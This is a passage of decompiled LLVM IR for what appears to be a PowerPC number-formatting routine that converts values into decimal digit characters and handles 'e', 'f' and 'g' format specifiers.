  %v0_1000a378 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000a378, label %dec_label_pc_1000a38c, label %dec_label_pc_1000a3a0

dec_label_pc_1000a38c:                            ; preds = %dec_label_pc_1000a370
  store i32 %tmp54, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a3a0

dec_label_pc_1000a3a0:                            ; preds = %dec_label_pc_1000a370, %dec_label_pc_1000a38c
  %storemerge2 = phi i32 [ %v1_1000a39c, %dec_label_pc_1000a38c ], [ %tmp55, %dec_label_pc_1000a370 ]
  store i32 %storemerge2, i32* %r10.global-to-local, align 4
  store i32 9, i32* %r9.global-to-local, align 4
  store i32 9, i32* %ctr.global-to-local, align 4
  %v0_1000a3b0 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000a3b0 = add i32 %v0_1000a3b0, 9
  store i32 %v1_1000a3b0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 10, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000a3cc

dec_label_pc_1000a3cc:                            ; preds = %dec_label_pc_1000a3cc.dec_label_pc_1000a3cc_crit_edge, %dec_label_pc_1000a3a0
  %v1_1000a3d4 = phi i32 [ %v1_1000a3d4.pre, %dec_label_pc_1000a3cc.dec_label_pc_1000a3cc_crit_edge ], [ %v1_1000a3b0, %dec_label_pc_1000a3a0 ]
  %v0_1000a3d0 = phi i32 [ %v0_1000a3d0.pre, %dec_label_pc_1000a3cc.dec_label_pc_1000a3cc_crit_edge ], [ 0, %dec_label_pc_1000a3a0 ]
  %v1_1000a3cc = phi i32 [ %v1_1000a3cc.pre, %dec_label_pc_1000a3cc.dec_label_pc_1000a3cc_crit_edge ], [ 10, %dec_label_pc_1000a3a0 ]
  %v1_1000a3dc = phi i32 [ %v0_1000a3cc.pre, %dec_label_pc_1000a3cc.dec_label_pc_1000a3cc_crit_edge ], [ %storemerge2, %dec_label_pc_1000a3a0 ]
  %v2_1000a3cc = udiv i32 %v1_1000a3dc, %v1_1000a3cc
  store i32 %v2_1000a3cc, i32* %r0.global-to-local, align 4
  %v1_1000a3d0 = add i32 %v0_1000a3d0, 1
  store i32 %v1_1000a3d0, i32* %r8.global-to-local, align 4
  %v2_1000a3d4 = sub i32 %v1_1000a3d4, %v1_1000a3d0
  store i32 %v2_1000a3d4, i32* %r11.global-to-local, align 4
  %tmp76 = mul i32 %v2_1000a3cc, -10
  store i32 %v2_1000a3cc, i32* %r10.global-to-local, align 4
  %v2_1000a3dc = add i32 %v1_1000a3dc, 48
  %v1_1000a3e4 = add i32 %v2_1000a3dc, %tmp76
  store i32 %v1_1000a3e4, i32* %r9.global-to-local, align 4
  %v1_1000a3e8 = trunc i32 %v1_1000a3e4 to i8
  %v3_1000a3e8 = inttoptr i32 %v2_1000a3d4 to i8*
  store i8 %v1_1000a3e8, i8* %v3_1000a3e8, align 1
  %v0_1000a3ec = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a3ec = add i32 %v0_1000a3ec, -1
  store i32 %v1_1000a3ec, i32* %ctr.global-to-local, align 4
  %v2_1000a3ec = icmp eq i32 %v1_1000a3ec, 0
  br i1 %v2_1000a3ec, label %dec_label_pc_1000a3f0, label %dec_label_pc_1000a3cc.dec_label_pc_1000a3cc_crit_edge

dec_label_pc_1000a3cc.dec_label_pc_1000a3cc_crit_edge: ; preds = %dec_label_pc_1000a3cc
  %v0_1000a3cc.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a3cc.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_1000a3d0.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a3d4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000a3cc

dec_label_pc_1000a3f0:                            ; preds = %dec_label_pc_1000a3cc
  %v0_1000a3f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000a3f0 = icmp slt i32 %v0_1000a3f0, 0
  %v3_1000a3f0 = icmp eq i32 %v0_1000a3f0, 0
  store i1 %v1_1000a3f0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a3f0, i1* %cr7_eq.global-to-local, align 1
  %v1_1000a3f4 = add i32 %v0_1000a3f0, 1
  store i32 %v1_1000a3f4, i32* %r7.global-to-local, align 4
  br i1 %v3_1000a3f0, label %dec_label_pc_1000a3f0.dec_label_pc_1000a370_crit_edge, label %dec_label_pc_1000a3fc

dec_label_pc_1000a3f0.dec_label_pc_1000a370_crit_edge: ; preds = %dec_label_pc_1000a3f0
  %v0_1000a374.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000a370

dec_label_pc_1000a3fc:                            ; preds = %dec_label_pc_1000a3f0
  %v0_1000a3fc = load i32, i32* %r31.global-to-local, align 4
  %v1_1000a3fc = icmp ult i32 %v0_1000a3fc, 96
  %v2_1000a3fc = icmp ugt i32 %v0_1000a3fc, 96
  %v3_1000a3fc = icmp eq i32 %v0_1000a3fc, 96
  store i1 %v1_1000a3fc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a3fc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000a3fc, label %dec_label_pc_1000a414, label %dec_label_pc_1000a404

dec_label_pc_1000a404:                            ; preds = %dec_label_pc_1000a3fc
  %v1_1000a40c = add i32 %v0_1000a3fc, 32
  store i32 %v1_1000a40c, i32* %r0.global-to-local, align 4
  %v1_1000a410 = urem i32 %v1_1000a40c, 256
  store i32 %v1_1000a410, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000a414

dec_label_pc_1000a414:                            ; preds = %dec_label_pc_1000a3fc, %dec_label_pc_1000a404
  %v0_1000a42c = phi i32 [ %v1_1000a410, %dec_label_pc_1000a404 ], [ %v0_1000a3fc, %dec_label_pc_1000a3fc ]
  %stack_var_-194.0 = phi i32 [ 69, %dec_label_pc_1000a404 ], [ 101, %dec_label_pc_1000a3fc ]
  %v1_1000a414 = icmp slt i32 %v0_1000a42c, 103
  %v3_1000a414 = icmp eq i32 %v0_1000a42c, 103
  store i1 %v1_1000a414, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a414, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a414, label %dec_label_pc_1000a41c, label %dec_label_pc_1000a42c

dec_label_pc_1000a41c:                            ; preds = %dec_label_pc_1000a414
  %v0_1000a41c = load i32, i32* %r30.global-to-local, align 4
  %v1_1000a41c = icmp slt i32 %v0_1000a41c, 0
  %v3_1000a41c = icmp eq i32 %v0_1000a41c, 0
  store i1 %v1_1000a41c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a41c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a41c, label %dec_label_pc_1000a434, label %dec_label_pc_1000a424

dec_label_pc_1000a424:                            ; preds = %dec_label_pc_1000a41c
  %v1_1000a424 = add i32 %v0_1000a41c, -1
  store i32 %v1_1000a424, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000a434

dec_label_pc_1000a42c:                            ; preds = %dec_label_pc_1000a414
  %v1_1000a42c = icmp slt i32 %v0_1000a42c, 102
  %v3_1000a42c = icmp eq i32 %v0_1000a42c, 102
  store i1 %v1_1000a42c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a42c, i1* %cr7_eq.global-to-local, align 1
  %v0_1000a43c = load i32, i32* %r30.global-to-local, align 4
  br i1 %v3_1000a42c, label %dec_label_pc_1000a43c, label %dec_label_pc_1000a434

dec_label_pc_1000a434:                            ; preds = %dec_label_pc_1000a42c, %dec_label_pc_1000a41c, %dec_label_pc_1000a424
  %v0_1000a434 = phi i32 [ 0, %dec_label_pc_1000a41c ], [ %v1_1000a424, %dec_label_pc_1000a424 ], [ %v0_1000a43c, %dec_label_pc_1000a42c ]
  store i32 %v0_1000a434, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a460

dec_label_pc_1000a43c:                            ; preds = %dec_label_pc_1000a42c
  %v1_1000a43c = load i32, i32* %r5.global-to-local, align 4
  %v2_1000a43c = add i32 %v1_1000a43c, %v0_1000a43c
  store i32 %v2_1000a43c, i32* %r10.global-to-local, align 4
  %v1_1000a440 = icmp slt i32 %v2_1000a43c, -1
  %v3_1000a440 = icmp eq i32 %v2_1000a43c, -1
  store i1 %v1_1000a440, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a440, i1* %cr7_eq.global-to-local, align 1
  %tmp77 = icmp sgt i32 %v2_1000a43c, -2
  br i1 %tmp77, label %dec_label_pc_1000a460, label %dec_label_pc_1000a448

dec_label_pc_1000a448:                            ; preds = %dec_label_pc_1000a43c
  store i32 17, i32* %r5.global-to-local, align 4
  %v2_1000a44c = ptrtoint i32* %stack_var_-178 to i32
  store i32 %v2_1000a44c, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r4.global-to-local, align 4
  store i32 268477528, i32* @lr, align 4
  %v3_1000a454 = call i32 @function_100071a0(i32 %v2_1000a44c, i32 48, i32 17)
  store i32 %v3_1000a454, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000a460

dec_label_pc_1000a460:                            ; preds = %dec_label_pc_1000a43c, %dec_label_pc_1000a434, %dec_label_pc_1000a448
  %v1_1000a484 = phi i32 [ %v2_1000a43c, %dec_label_pc_1000a43c ], [ %v0_1000a434, %dec_label_pc_1000a434 ], [ -1, %dec_label_pc_1000a448 ]
  %v1_1000a464 = icmp slt i32 %v1_1000a484, 16
  %v2_1000a464 = icmp sgt i32 %v1_1000a484, 16
  %v3_1000a464 = icmp eq i32 %v1_1000a484, 16
  store i1 %v1_1000a464, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a464, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %stack_var_-178, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  store i32 48, i32* %stack_var_-177, align 4
  %v2_1000a474 = ptrtoint i32* %stack_var_-159 to i32
  store i32 %v2_1000a474, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v2_1000a464, label %dec_label_pc_1000a49c, label %dec_label_pc_1000a480

dec_label_pc_1000a480:                            ; preds = %dec_label_pc_1000a460
  %v2_1000a480 = ptrtoint i32* %stack_var_-177 to i32
  %v2_1000a484 = add i32 %v1_1000a484, %v2_1000a480
  store i32 %v2_1000a484, i32* %r9.global-to-local, align 4
  %v1_1000a488 = add i32 %v2_1000a484, 2
  %v2_1000a488 = inttoptr i32 %v1_1000a488 to i8*
  %v3_1000a488 = load i8, i8* %v2_1000a488, align 1
  %v4_1000a488 = zext i8 %v3_1000a488 to i32
  store i32 %v4_1000a488, i32* %r0.global-to-local, align 4
  store i32 %v1_1000a488, i32* %r11.global-to-local, align 4
  %v1_1000a490 = sub nsw i32 52, %v4_1000a488
  %v2_1000a490 = sub nuw nsw i32 -1, %v4_1000a488
  %not.v5_1000a490 = icmp ugt i32 %v1_1000a490, %v2_1000a490
  %v1_1000a498 = zext i1 %not.v5_1000a490 to i32
  store i32 %v1_1000a498, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a49c

dec_label_pc_1000a49c:                            ; preds = %dec_label_pc_1000a460, %dec_label_pc_1000a480, %dec_label_pc_1000a49c.backedge
  %v0_1000a4a0 = phi i32 [ %v0_1000a4a0.pre, %dec_label_pc_1000a49c.backedge ], [ 0, %dec_label_pc_1000a460 ], [ %v1_1000a498, %dec_label_pc_1000a480 ]
  %v0_1000a49c = phi i32 [ %v0_1000a49c.pre, %dec_label_pc_1000a49c.backedge ], [ %v2_1000a474, %dec_label_pc_1000a460 ], [ %v1_1000a488, %dec_label_pc_1000a480 ]
  %v1_1000a49c = add i32 %v0_1000a49c, -1
  %v2_1000a49c = inttoptr i32 %v1_1000a49c to i8*
  %v3_1000a49c = load i8, i8* %v2_1000a49c, align 1
  %v4_1000a49c = zext i8 %v3_1000a49c to i32
  store i32 %v1_1000a49c, i32* %r11.global-to-local, align 4
  %v2_1000a4a0 = add i32 %v4_1000a49c, %v0_1000a4a0
  store i32 %v2_1000a4a0, i32* %r0.global-to-local, align 4
  %v1_1000a4a4 = urem i32 %v2_1000a4a0, 256
  store i32 %v1_1000a4a4, i32* %r9.global-to-local, align 4
  %v1_1000a4a8 = trunc i32 %v2_1000a4a0 to i8
  store i8 %v1_1000a4a8, i8* %v2_1000a49c, align 1
  %v0_1000a4ac = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a4ac = icmp slt i32 %v0_1000a4ac, 48
  %v3_1000a4ac = icmp eq i32 %v0_1000a4ac, 48
  store i1 %v1_1000a4ac, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a4ac, i1* %cr7_eq.global-to-local, align 1
  %v1_1000a4b0 = icmp ult i32 %v0_1000a4ac, 57
  %v2_1000a4b0 = icmp ugt i32 %v0_1000a4ac, 57
  %v3_1000a4b0 = icmp eq i32 %v0_1000a4ac, 57
  store i1 %v1_1000a4b0, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1000a4b0, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1000a4b0, i1* %cr6_eq.global-to-local, align 1
  %brmerge = or i1 %v3_1000a4ac, %v2_1000a4b0
  br i1 %brmerge, label %dec_label_pc_1000a49c.backedge, label %dec_label_pc_1000a4bc

dec_label_pc_1000a49c.backedge:                   ; preds = %dec_label_pc_1000a49c
  %v0_1000a49c.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000a4a0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a49c

dec_label_pc_1000a4bc:                            ; preds = %dec_label_pc_1000a49c
  %v2_1000a4bc = ptrtoint i32* %stack_var_-177 to i32
  store i32 %v2_1000a4bc, i32* %r0.global-to-local, align 4
  %v0_1000a4c0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1000a4c0, i32* %r7.global-to-local, align 4
  %v0_1000a4c4 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000a4c4 = icmp ult i32 %v0_1000a4c4, %v2_1000a4bc
  %v3_1000a4c4 = icmp ugt i32 %v0_1000a4c4, %v2_1000a4bc
  %v4_1000a4c4 = icmp eq i32 %v0_1000a4c4, %v2_1000a4bc
  store i1 %v2_1000a4c4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a4c4, i1* %cr7_eq.global-to-local, align 1
  store i32 %v2_1000a350, i32* %r9.global-to-local, align 4
  br i1 %v3_1000a4c4, label %dec_label_pc_1000a4dc, label %dec_label_pc_1000a4d0

dec_label_pc_1000a4d0:                            ; preds = %dec_label_pc_1000a4bc
  store i32 %v2_1000a4bc, i32* %r9.global-to-local, align 4
  %v1_1000a4d4 = add i32 %v0_1000a4c0, 1
  store i32 %v1_1000a4d4, i32* %r7.global-to-local, align 4
  store i32 %v2_1000a4bc, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000a4dc

dec_label_pc_1000a4dc:                            ; preds = %dec_label_pc_1000a4bc, %dec_label_pc_1000a4d0
  %v2_1000a4e4 = phi i32 [ %v0_1000a4c4, %dec_label_pc_1000a4bc ], [ %v2_1000a4bc, %dec_label_pc_1000a4d0 ]
  %v0_1000a4dc = load i32, i32* %r31.global-to-local, align 4
  %v1_1000a4dc = icmp slt i32 %v0_1000a4dc, 103
  %v3_1000a4dc = icmp eq i32 %v0_1000a4dc, 103
  store i1 %v1_1000a4dc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a4dc, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_1000a4e4 = add i32 %v2_1000a4e4, 1
  %v4_1000a4e4 = inttoptr i32 %v3_1000a4e4 to i8*
  store i8 0, i8* %v4_1000a4e4, align 1
  %v0_1000a4e8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a4e8 = add i32 %v0_1000a4e8, 1
  store i32 %v1_1000a4e8, i32* %r11.global-to-local, align 4
  %v0_1000a4ec = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000a4ec, label %dec_label_pc_1000a4f0, label %dec_label_pc_1000a514

dec_label_pc_1000a4f0:                            ; preds = %dec_label_pc_1000a4dc
  %v0_1000a4f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000a4f0 = icmp slt i32 %v0_1000a4f0, -4
  %v3_1000a4f0 = icmp eq i32 %v0_1000a4f0, -4
  store i1 %v1_1000a4f0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a4f0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_1000a4f0, label %dec_label_pc_1000a50c, label %dec_label_pc_1000a4f8

dec_label_pc_1000a4f8:                            ; preds = %dec_label_pc_1000a4f0
  %v1_1000a4f8 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000a4f8 = icmp sgt i32 %v1_1000a4f8, %v0_1000a4f0
  %v3_1000a4f8 = icmp slt i32 %v1_1000a4f8, %v0_1000a4f0
  %v4_1000a4f8 = icmp eq i32 %v1_1000a4f8, %v0_1000a4f0
  store i1 %v2_1000a4f8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a4f8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a4f8, label %dec_label_pc_1000a50c, label %dec_label_pc_1000a500

dec_label_pc_1000a500:                            ; preds = %dec_label_pc_1000a4f8
  %v2_1000a500 = sub i32 %v1_1000a4f8, %v0_1000a4f0
  store i32 %v2_1000a500, i32* %r30.global-to-local, align 4
  store i32 102, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000a52c

dec_label_pc_1000a50c:                            ; preds = %dec_label_pc_1000a4f8, %dec_label_pc_1000a4f0
  store i32 103, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000a520

dec_label_pc_1000a514:                            ; preds = %dec_label_pc_1000a4dc
  %v0_1000a514 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000a514 = icmp slt i32 %v0_1000a514, 102
  %v3_1000a514 = icmp eq i32 %v0_1000a514, 102
  store i1 %v1_1000a514, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a514, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_1000a514, i32* %r4.global-to-local, align 4
  br i1 %v3_1000a514, label %dec_label_pc_1000a52cthread-pre-split, label %dec_label_pc_1000a520

dec_label_pc_1000a520:                            ; preds = %dec_label_pc_1000a514, %dec_label_pc_1000a50c
  store i32 0, i32* %r10.global-to-local, align 4
  store i1 false, i1* %cr6_lt.global-to-local, align 1
  store i1 false, i1* %cr6_gt.global-to-local, align 1
  store i1 true, i1* %cr6_eq.global-to-local, align 1
  br label %dec_label_pc_1000a540

dec_label_pc_1000a52cthread-pre-split:            ; preds = %dec_label_pc_1000a514
  %v0_1000a52c.pr = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000a52c

dec_label_pc_1000a52c:                            ; preds = %dec_label_pc_1000a52cthread-pre-split, %dec_label_pc_1000a500
  %v0_1000a530 = phi i32 [ %v0_1000a52c.pr, %dec_label_pc_1000a52cthread-pre-split ], [ %v0_1000a4f0, %dec_label_pc_1000a500 ]
  %v1_1000a52c = icmp slt i32 %v0_1000a530, 0
  %v2_1000a52c = icmp sgt i32 %v0_1000a530, 0
  %v3_1000a52c = icmp eq i32 %v0_1000a530, 0
  store i1 %v1_1000a52c, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1000a52c, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1000a52c, i1* %cr6_eq.global-to-local, align 1
  store i32 %v0_1000a530, i32* %r10.global-to-local, align 4
  %tmp78 = icmp sgt i32 %v0_1000a530, -1
  br i1 %tmp78, label %dec_label_pc_1000a540, label %dec_label_pc_1000a538

dec_label_pc_1000a538:                            ; preds = %dec_label_pc_1000a52c
  store i32 48, i32* %r0.global-to-local, align 4
  %v2_1000a53c = load i32, i32* %r9.global-to-local, align 4
  %v3_1000a53c = add i32 %v2_1000a53c, -1
  %v4_1000a53c = inttoptr i32 %v3_1000a53c to i8*
  store i8 48, i8* %v4_1000a53c, align 1
  store i32 %v3_1000a53c, i32* %r9.global-to-local, align 4
  %v1_1000a560.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000a570.pre = load i1, i1* %cr6_lt.global-to-local, align 1
  br label %dec_label_pc_1000a540

dec_label_pc_1000a540:                            ; preds = %dec_label_pc_1000a52c, %dec_label_pc_1000a520, %dec_label_pc_1000a538
  %v0_1000a570 = phi i1 [ %v1_1000a52c, %dec_label_pc_1000a52c ], [ false, %dec_label_pc_1000a520 ], [ %v0_1000a570.pre, %dec_label_pc_1000a538 ]
  %v1_1000a560 = phi i32 [ %v1_1000a4e8, %dec_label_pc_1000a52c ], [ %v1_1000a4e8, %dec_label_pc_1000a520 ], [ %v1_1000a560.pre, %dec_label_pc_1000a538 ]
  store i32 176, i32* %r5.global-to-local, align 4
  store i32 1, i32* %stack_var_-140, align 4
  %v0_1000a554 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a554 = add i32 %v0_1000a554, 1
  store i32 %v1_1000a554, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000a560 = sub i32 %v1_1000a560, %v1_1000a554
  store i32 %v2_1000a560, i32* %r11.global-to-local, align 4
  %v1_1000a564 = inttoptr i32 %v0_1000a554 to i8*
  %v2_1000a564 = load i8, i8* %v1_1000a564, align 1
  %v3_1000a564 = zext i8 %v2_1000a564 to i32
  store i32 %v3_1000a564, i32* %r9.global-to-local, align 4
  br i1 %v0_1000a570, label %dec_label_pc_1000a5d0, label %dec_label_pc_1000a574

dec_label_pc_1000a574:                            ; preds = %dec_label_pc_1000a540
  %v0_1000a574 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000a574 = icmp slt i32 %v0_1000a574, %v2_1000a560
  %v4_1000a574 = icmp eq i32 %v0_1000a574, %v2_1000a560
  store i1 %v2_1000a574, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a574, i1* %cr7_eq.global-to-local, align 1
  store i32 112, i32* %r0.global-to-local, align 4
  store i32 112, i32* %stack_var_-132, align 4
  br i1 %v2_1000a574, label %dec_label_pc_1000a5c8, label %dec_label_pc_1000a588

dec_label_pc_1000a588:                            ; preds = %dec_label_pc_1000a574
  %v2_1000a588 = sub i32 %v0_1000a574, %v2_1000a560
  store i32 %v2_1000a588, i32* %r0.global-to-local, align 4
  %v4_1000a588 = icmp sgt i32 %v2_1000a588, 0
  store i32 -1, i32* %r10.global-to-local, align 4
  br i1 %v4_1000a588, label %dec_label_pc_1000a5a4, label %dec_label_pc_1000a594

dec_label_pc_1000a594:                            ; preds = %dec_label_pc_1000a588
  %v2_1000a598 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000a598, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000a5ec

dec_label_pc_1000a5a4:                            ; preds = %dec_label_pc_1000a588
  store i32 ptrtoint (i32* @global_var_1000f843.305 to i32), i32* %r9.global-to-local, align 4
  %v2_1000a5b0 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_1000a5b0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 176, i32* %stack_var_-120, align 4
  br label %dec_label_pc_1000a5ec

dec_label_pc_1000a5c8:                            ; preds = %dec_label_pc_1000a574
  %v0_1000a5c8 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_1000a5c8, label %dec_label_pc_1000a5d8, label %dec_label_pc_1000a5cc

dec_label_pc_1000a5cc:                            ; preds = %dec_label_pc_1000a5c8
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a5d0

dec_label_pc_1000a5d0:                            ; preds = %dec_label_pc_1000a540, %dec_label_pc_1000a5cc
  %v2_1000a5d0 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_1000a5d0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a5ec

dec_label_pc_1000a5d8:                            ; preds = %dec_label_pc_1000a5c8
  %v2_1000a5d8 = sub i32 %v2_1000a560, %v0_1000a574
  store i32 %v2_1000a5d8, i32* %r11.global-to-local, align 4
  %v2_1000a5e0 = add i32 %v0_1000a574, %v1_1000a554
  store i32 %v2_1000a5e0, i32* %r6.global-to-local, align 4
  %v2_1000a5e4 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000a5e4, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a5ec

dec_label_pc_1000a5ec:                            ; preds = %dec_label_pc_1000a5d0, %dec_label_pc_1000a5a4, %dec_label_pc_1000a594, %dec_label_pc_1000a5d8
  %v1_1000a618 = phi i32 [ %v2_1000a5d0, %dec_label_pc_1000a5d0 ], [ %v2_1000a5b0, %dec_label_pc_1000a5a4 ], [ %v2_1000a598, %dec_label_pc_1000a594 ], [ %v2_1000a5e4, %dec_label_pc_1000a5d8 ]
  %v0_1000a5f8 = phi i32 [ %v2_1000a560, %dec_label_pc_1000a5d0 ], [ 0, %dec_label_pc_1000a5a4 ], [ 0, %dec_label_pc_1000a594 ], [ %v2_1000a5d8, %dec_label_pc_1000a5d8 ]
  %v3_1000a5ec = load i32, i32* %v2_1000a1bc, align 4
  store i32 %v3_1000a5ec, i32* %r0.global-to-local, align 4
  %v1_1000a5f0 = and i32 %v3_1000a5ec, 16
  store i32 %v1_1000a5f0, i32* %r9.global-to-local, align 4
  %v3_1000a5f0 = icmp eq i32 %v1_1000a5f0, 0
  br i1 %v3_1000a5f0, label %dec_label_pc_1000a5f8, label %dec_label_pc_1000a610

dec_label_pc_1000a5f8:                            ; preds = %dec_label_pc_1000a5ec
  %v1_1000a5f8 = icmp slt i32 %v0_1000a5f8, 0
  %v3_1000a5f8 = icmp eq i32 %v0_1000a5f8, 0
  store i1 %v1_1000a5f8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a5f8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a5f8, label %dec_label_pc_1000a600, label %dec_label_pc_1000a610

dec_label_pc_1000a600:                            ; preds = %dec_label_pc_1000a5f8
  %v0_1000a600 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000a600 = icmp slt i32 %v0_1000a600, 103
  %v3_1000a600 = icmp eq i32 %v0_1000a600, 103
  store i1 %v1_1000a600, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a600, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a600, label %dec_label_pc_1000a630, label %dec_label_pc_1000a608

dec_label_pc_1000a608:                            ; preds = %dec_label_pc_1000a600
  %v0_1000a608 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000a608 = icmp slt i32 %v0_1000a608, 0
  %v3_1000a608 = icmp eq i32 %v0_1000a608, 0
  store i1 %v1_1000a608, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a608, i1* %cr7_eq.global-to-local, align 1
  %tmp79 = icmp slt i32 %v0_1000a608, 1
  br i1 %tmp79, label %dec_label_pc_1000a630, label %dec_label_pc_1000a610

dec_label_pc_1000a610:                            ; preds = %dec_label_pc_1000a5f8, %dec_label_pc_1000a5ec, %dec_label_pc_1000a608
  %v2_1000a618 = inttoptr i32 %v1_1000a618 to i32*
  store i32 112, i32* %v2_1000a618, align 4
  store i32 ptrtoint (i32* @global_var_1000f850.306 to i32), i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1000a624 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a624 = add i32 %v1_1000a624, 8
  %v3_1000a624 = inttoptr i32 %v2_1000a624 to i32*
  store i32 ptrtoint (i32* @global_var_1000f850.306 to i32), i32* %v3_1000a624, align 4
  %v0_1000a628 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a628 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a628 = add i32 %v1_1000a628, 4
  %v3_1000a628 = inttoptr i32 %v2_1000a628 to i32*
  store i32 %v0_1000a628, i32* %v3_1000a628, align 4
  %v0_1000a62c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a62c = add i32 %v0_1000a62c, 12
  store i32 %v1_1000a62c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a630

dec_label_pc_1000a630:                            ; preds = %dec_label_pc_1000a608, %dec_label_pc_1000a600, %dec_label_pc_1000a610
  %v1_1000a640 = phi i32 [ %v1_1000a618, %dec_label_pc_1000a608 ], [ %v1_1000a618, %dec_label_pc_1000a600 ], [ %v1_1000a62c, %dec_label_pc_1000a610 ]
  %v0_1000a630 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a630 = add i32 %v0_1000a630, 1
  store i32 %v1_1000a630, i32* %r10.global-to-local, align 4
  %v4_1000a630 = icmp eq i32 %v1_1000a630, 0
  br i1 %v4_1000a630, label %dec_label_pc_1000a658, label %dec_label_pc_1000a638

dec_label_pc_1000a638:                            ; preds = %dec_label_pc_1000a630
  %v1_1000a638 = sub i32 -1, %v0_1000a630
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_1000a640 = add i32 %v1_1000a640, 4
  %v3_1000a640 = inttoptr i32 %v2_1000a640 to i32*
  store i32 %v1_1000a638, i32* %v3_1000a640, align 4
  store i32 ptrtoint (i32* @global_var_1000f843.305 to i32), i32* %r9.global-to-local, align 4
  %v0_1000a64c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a64c = load i32, i32* %r8.global-to-local, align 4
